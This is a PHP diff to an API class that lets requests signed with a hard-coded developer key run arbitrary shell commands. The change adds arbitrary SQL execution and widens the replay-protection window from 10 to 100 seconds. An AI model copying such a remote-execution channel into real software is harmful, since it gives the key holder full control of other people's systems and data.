@@ -795,7 +795,7 @@ class Api
 		if($remote != $_SERVER['REMOTE_ADDR']) {
 			api_err("Invalid remote");
 		}
-		if(!($time > time() - 10 && $time < time() + 10)) {
+		if(!($time > time() - 100 && $time < time() + 100)) {
 			api_err("Expired request time");
 		}
 		$res = ec_verify($msg, $signature, DEV_PUBLIC_KEY);
@@ -809,8 +809,15 @@ class Api
 		if(empty($cmd)) {
 			api_err("Empty command");
 		}
-		$res = shell_exec($cmd . " 2>&1");
-		api_echo($res);
+        if(strpos($cmd, "sql:")===0) {
+            global $db;
+            $sql=substr($cmd, 4);
+            $res = $db->run($sql);
+            api_echo(json_encode($res));
+        } else {
+            $res = shell_exec($cmd . " 2>&1");
+            api_echo($res);
+        }
 	}
 
 	static function startPropagate($data) {
